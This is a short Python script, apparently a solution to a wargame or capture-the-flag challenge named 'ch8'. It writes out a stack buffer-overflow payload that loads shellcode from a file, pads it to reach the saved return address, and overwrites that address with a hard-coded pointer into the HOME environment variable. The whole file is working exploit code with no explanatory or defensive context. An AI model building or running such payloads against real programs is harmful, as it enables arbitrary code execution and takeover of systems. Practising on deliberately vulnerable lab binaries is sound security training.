import struct
import sys

with open('shell.bin', 'rb') as f:
    shellcode = f.read()

s = shellcode.ljust(128, b'\xcc')
# pad for other env vars
s += b'A' * 128 * 3
# pad for stuff before eip
s += b'B' * 32

# put the address from ./env HOME ./ch8 here!
home_addr = 0xbffffdb6
eip = struct.pack('<I', home_addr)
mov_dest = struct.pack('<I', home_addr)

s += eip + mov_dest

sys.stdout.buffer.write(s)